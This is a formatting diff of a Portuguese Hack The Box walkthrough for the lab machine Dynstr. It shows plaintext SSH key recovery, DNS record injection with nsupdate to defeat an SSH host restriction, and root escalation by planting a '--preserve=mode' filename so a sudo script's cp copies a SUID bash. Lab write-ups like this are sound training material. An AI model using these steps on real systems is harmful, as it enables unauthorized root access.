@@ -19,8 +19,9 @@ Olá pessoal!
 
 A máquina desta semana será **Dynstr**, outra máquina Linux classificada como mediana do [Hack The Box](https://www.hackthebox.eu/), criada por [jkr](https://app.hackthebox.eu/users/77141).
 
-\:information\_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
-\[info]
+<Alert kind="info" title="Info">
+  Write-ups para máquinas do Hack The Box são postados assim que as máquinas são aposentadas.
+</Alert>
 
 ![HTB Dynstr](https://i.imgur.com/kqW8fwk.png)
 
@@ -65,13 +66,13 @@ Acessando o website, como mencionado no título da página, temos a Dyna DNS com
 
 ![HTB Dynstr - Dyna DNS](https://i.imgur.com/gtdmYDI.jpg)
 
-Embora seja um website que consiste apenas em um single page application, este site foi especialmente útil por conter informações muito interessantes na seção *Our Services*, que foram imprescindíveis durante a resolução desta máquina, além do domínio `dynadns.htb`, utilizado como endereço de e-mail no contato presente no rodapé:
+Embora seja um website que consiste apenas em um single page application, este site foi especialmente útil por conter informações muito interessantes na seção _Our Services_, que foram imprescindíveis durante a resolução desta máquina, além do domínio `dynadns.htb`, utilizado como endereço de e-mail no contato presente no rodapé:
 
 ![HTB Dynstr - Dyna DNS Services](https://i.imgur.com/QZvDDXJ.png)
 
-* Provê uma aplicação para registro de DNS que utiliza da mesma API que `no-ip.com`, conforme disponível na documentação pública em [Integrate with No-IP DDNS - API Information (noip.com)](https://www.noip.com/integrate/request).
-* Os domínios possíveis de se utilizar com o serviço encontram-se listados, os quais foram incluídos no arquivo hosts local.
-* Credenciais para demonstrações foram fornecidas, então podemos começar a brincar com esta API \:smile:
+- Provê uma aplicação para registro de DNS que utiliza da mesma API que `no-ip.com`, conforme disponível na documentação pública em [Integrate with No-IP DDNS - API Information (noip.com)](https://www.noip.com/integrate/request).
+- Os domínios possíveis de se utilizar com o serviço encontram-se listados, os quais foram incluídos no arquivo hosts local.
+- Credenciais para demonstrações foram fornecidas, então podemos começar a brincar com esta API \:smile:
 
 #### Interagindo com a API
 
@@ -216,7 +217,7 @@ Authorization: Basic ZHluYWRuczpzbmRhbnlk
 
 Iniciei a enumeração utilizando a conta `www-data`, padrão para o apache, utilizando o `linpeas.sh`, onde os seguintes itens foram identificados:
 
-* Usuários com console e suas permissões:
+- Usuários com console e suas permissões:
 
 ```plaintext
 uid=0(root) gid=0(root) groups=0(root)
@@ -224,7 +225,7 @@ uid=1000(dyna) gid=1000(dyna) groups=1000(dyna),4(adm),24(cdrom),27(sudo),30(dip
 uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
 ```
 
-* Habilidade de listar o conteúdo do diretório de outros usuários, onde podemos ver algumas chaves SSH para a conta `bindmgr`
+- Habilidade de listar o conteúdo do diretório de outros usuários, onde podemos ver algumas chaves SSH para a conta `bindmgr`
 
 ```plaintext
 ╔══════════╣ Files inside others home (limit 20)
@@ -246,7 +247,7 @@ uid=1001(bindmgr) gid=1001(bindmgr) groups=1001(bindmgr)
 /home/dyna/.sudo_as_admin_successful
 ```
 
-* Revisando o conteúdo do diretório `/home/bindmgr`, podemos observar o arquivo `user.txt` para o qual não temos direitos de leitura. Neste perfil de usuário existe também uma pasta chamada `support-case-C62796521`, que contém alguns ouputs de debugging/trace de outras tarefas executadas no servidor.
+- Revisando o conteúdo do diretório `/home/bindmgr`, podemos observar o arquivo `user.txt` para o qual não temos direitos de leitura. Neste perfil de usuário existe também uma pasta chamada `support-case-C62796521`, que contém alguns ouputs de debugging/trace de outras tarefas executadas no servidor.
 
 ```bash
 www-data@dynstr:/var/www$ ls -la /home/bindmgr/
@@ -264,7 +265,7 @@ drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521
 www-data@dynstr:/var/www$
 ```
 
-* Após analisar estes arquivos, notei que no `strace-C62796521.txt` temos uma chave privada em texto plano, que foi extraída e salva como `id_rsa`.
+- Após analisar estes arquivos, notei que no `strace-C62796521.txt` temos uma chave privada em texto plano, que foi extraída e salva como `id_rsa`.
 
 ```plaintext
 [...]
@@ -272,14 +273,14 @@ www-data@dynstr:/var/www$
 [...]
 ```
 
-* Quando tentei utilizar esta chave para conectar via SSH com a conta `bindmgr`, recebi um erro. Ao revisar o conteúdo do arquivo `authorized_keys`, notei que temos uma instrução `from` definida, que limita a conexão utilizando a referida chave RSA a um determinado escopo de sistemas, neste caso máquinas com no subdomínio `*.infra.dyna.htb`.
+- Quando tentei utilizar esta chave para conectar via SSH com a conta `bindmgr`, recebi um erro. Ao revisar o conteúdo do arquivo `authorized_keys`, notei que temos uma instrução `from` definida, que limita a conexão utilizando a referida chave RSA a um determinado escopo de sistemas, neste caso máquinas com no subdomínio `*.infra.dyna.htb`.
 
 ```bash
 www-data@dynstr:/tmp$ cat /home/bindmgr/.ssh/authorized_keys
 from="*.infra.dyna.htb" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF4pkc7L5EaGz6CcwSCx1BqzuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7aXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38PZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WOD bindmgr@nomen
 ```
 
-* Para contornar este ponto, poderíamos alterar o arquivo hosts da máquina, o que não é possível dado privilégios atuais, ou utilizar o `nsupdate` para incluir a entrada desejada no servidor DNS, na zona `infra.dyna.htb`, o que foi tentado a partir do comando que é utilizado pela API, conforme abaixo:
+- Para contornar este ponto, poderíamos alterar o arquivo hosts da máquina, o que não é possível dado privilégios atuais, ou utilizar o `nsupdate` para incluir a entrada desejada no servidor DNS, na zona `infra.dyna.htb`, o que foi tentado a partir do comando que é utilizado pela API, conforme abaixo:
 
 ```php
 // Update DNS entry
@@ -287,7 +288,7 @@ $cmd = sprintf("server 127.0.0.1\nzone %s\nupdate delete %s.%s\nupdate add %s.%s
 system('echo "'.$cmd.'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key',$retval);
 ```
 
-* Com base nisso, utilizei o seguinte comando para adicionar a nossa entrada no referido subdomínio, porém a ação foi recusada.
+- Com base nisso, utilizei o seguinte comando para adicionar a nossa entrada no referido subdomínio, porém a ação foi recusada.
 
 ```bash
 www-data@dynstr:/dev/shm$ cat nsupdate
@@ -300,7 +301,7 @@ www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/ddn
 update failed: REFUSED
 ```
 
-* Após alguma pesquisa, encontrei que o status REFUSED poderia ocorrer se utilizasse uma chave inválida e, validando o diretório onde a chave `ddns.key` está localizada, encontrei outros dois arquivos (conforme abaixo) que poderiam ser utilizados, para o qual o `infra.key` retornou o sucesso esperado, embora ainda não tenha conseguido me conectar via SSH
+- Após alguma pesquisa, encontrei que o status REFUSED poderia ocorrer se utilizasse uma chave inválida e, validando o diretório onde a chave `ddns.key` está localizada, encontrei outros dois arquivos (conforme abaixo) que poderiam ser utilizados, para o qual o `infra.key` retornou o sucesso esperado, embora ainda não tenha conseguido me conectar via SSH
 
 ```bash
 www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key
@@ -309,7 +310,7 @@ www-data@dynstr:/dev/shm$ ls -la /etc/bind/*.key
 -rw-r----- 1 bind bind 100 Mar 15 20:14 /etc/bind/rndc.key
 ```
 
-* Com algum troubleshooting adicional notei que a partir do servidor DNS era capaz de resolver o nome `attacker.infra.dyna.htb` mas a busca a reversa, a partir do endereço IP não era possível. Para contornar isso, incluí no comando de `nsupdate` as instruções necessárias para também incluir o registro do tipo PTR no DNS. Um ponto crucial que tive que fazer troubleshoot foi que entre as entradas A e PTR **deve existir uma linha em branco**, caso contrário o update falhará.
+- Com algum troubleshooting adicional notei que a partir do servidor DNS era capaz de resolver o nome `attacker.infra.dyna.htb` mas a busca a reversa, a partir do endereço IP não era possível. Para contornar isso, incluí no comando de `nsupdate` as instruções necessárias para também incluir o registro do tipo PTR no DNS. Um ponto crucial que tive que fazer troubleshoot foi que entre as entradas A e PTR **deve existir uma linha em branco**, caso contrário o update falhará.
 
 ```bash
 www-data@dynstr:/dev/shm$ cat nsupdate
@@ -323,7 +324,7 @@ www-data@dynstr:/dev/shm$ cat nsupdate | /usr/bin/nsupdate -t 1 -k /etc/bind/inf
 www-data@dynstr:/dev/shm$
 ```
 
-* Após os devidos ajustes, fui capaz de me conectar com a conta `bindmgr` via SSH e ler o conteúdo do arquivo `user.txt`
+- Após os devidos ajustes, fui capaz de me conectar com a conta `bindmgr` via SSH e ler o conteúdo do arquivo `user.txt`
 
 ```bash
 bindmgr@dynstr:~$ ls -la
@@ -359,7 +360,7 @@ User bindmgr may run the following commands on dynstr:
 bindmgr@dynstr:~
 ```
 
-Ao validar seu conteúdo, notei que existia uma entrada bastante interessante **na linha 42**, onde o script, executando como `root`, copia o arquivo `.version` e todos os demais existentes no diretório atual (`*`) para $BINDMGR\_DIR. Também requer que o arquivo `.version` no diretório atual seja comparado com o previamente existente no servidor.
+Ao validar seu conteúdo, notei que existia uma entrada bastante interessante **na linha 42**, onde o script, executando como `root`, copia o arquivo `.version` e todos os demais existentes no diretório atual (`*`) para $BINDMGR_DIR. Também requer que o arquivo `.version` no diretório atual seja comparado com o previamente existente no servidor.
 
 ```bash
 # Stage new version of configuration files.
@@ -388,7 +389,7 @@ drwxr-sr-x 3 root bind 4096 Aug 16 18:22 ..
 
 Revisando a página [cp | GTFOBins](https://gtfobins.github.io/gtfobins/cp/#suid) para o cenário de SUID, notei que se o `cp` tiver este modo habilitado, poderia ser utilizado para copiar arquivos restritos do sistema, porém como não é o caso, precisaremos de outro meio de abusar do binário `cp` invocado neste script.
 
-Um ponto mencionado na página acima é que podemos utilizar o parâmetro `--preserve` para **preservar os atributos de arquivos** durante a cópia. Adicionar este parâmetro na execução pode ser alcançado graças à uma feature do `bash` chamada **file name expansion**, popularmente conhecida como ***[globbing](https://tldp.org/LDP/abs/html/globbingref.html)*** que **expande** os nomes dos arquivos durante a execução dos comandos. Este comportamento pode ser visto no exemplo abaixo com o comando `echo`:
+Um ponto mencionado na página acima é que podemos utilizar o parâmetro `--preserve` para **preservar os atributos de arquivos** durante a cópia. Adicionar este parâmetro na execução pode ser alcançado graças à uma feature do `bash` chamada **file name expansion**, popularmente conhecida como **_[globbing](https://tldp.org/LDP/abs/html/globbingref.html)_** que **expande** os nomes dos arquivos durante a execução dos comandos. Este comportamento pode ser visto no exemplo abaixo com o comando `echo`:
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.PdP9Qf49qx$ ls -l
@@ -403,7 +404,7 @@ Isso poderia ser explorado de modo a abusar da execução do `cp`, copiando um a
 
 Este comportamento foi alcançado a partir da execução dos seguintes passos:
 
-* Copiado o arquivo `/bin/bash` para um diretório temporário e ajustado o SUID bit, assim como criado um arquivo `.version` contendo uma versão inicial.
+- Copiado o arquivo `/bin/bash` para um diretório temporário e ajustado o SUID bit, assim como criado um arquivo `.version` contendo uma versão inicial.
 
 ```bash
 bindmgr@dynstr:/tmp$ cd $(mktemp -d)
@@ -418,7 +419,7 @@ drwxrwxrwt 13 root    root       4096 Aug 16 19:22 ..
 -rw-rw-r--  1 bindmgr bindmgr       2 Aug 16 19:22 .version
 ```
 
-* Criado também um arquivo chamado `--preserve=mode`, de forma que seu nome seja interpretado como um parâmetro para a execução do `cp`, copiando o binário `bash`, porém mantendo o SUID configurado. Podemos confirmar este comportamento a partir do comando `echo`, também abaixo:
+- Criado também um arquivo chamado `--preserve=mode`, de forma que seu nome seja interpretado como um parâmetro para a execução do `cp`, copiando o binário `bash`, porém mantendo o SUID configurado. Podemos confirmar este comportamento a partir do comando `echo`, também abaixo:
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo "" > ./--preserve=mode
@@ -426,7 +427,7 @@ bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ echo *
 bash --preserve=mode
 ```
 
-* Executei o script usando o `sudo`
+- Executei o script usando o `sudo`
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ sudo /usr/local/bin/bindmgr.sh
@@ -442,7 +443,7 @@ sudo: unable to resolve host dynstr.dyna.htb: Name or service not known
     /etc/bind/named.bindmgr/bash:40: unexpected token near '}'
 ```
 
-* Executei o binário `bash` com o parâmetro `-p`, conforme orientado na página [bash | GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), o que me permitiu um shell interativo com a conta `root`, a partir da qual fui capaz de ler o conteúdo do arquivo `/root/root.txt` \:smiley:
+- Executei o binário `bash` com o parâmetro `-p`, conforme orientado na página [bash | GTFOBins](https://gtfobins.github.io/gtfobins/bash/#suid), o que me permitiu um shell interativo com a conta `root`, a partir da qual fui capaz de ler o conteúdo do arquivo `/root/root.txt` \:smiley:
 
 ```bash
 bindmgr@dynstr:/tmp/tmp.7i6oryDsae$ /etc/bind/named.bindmgr/bash -p
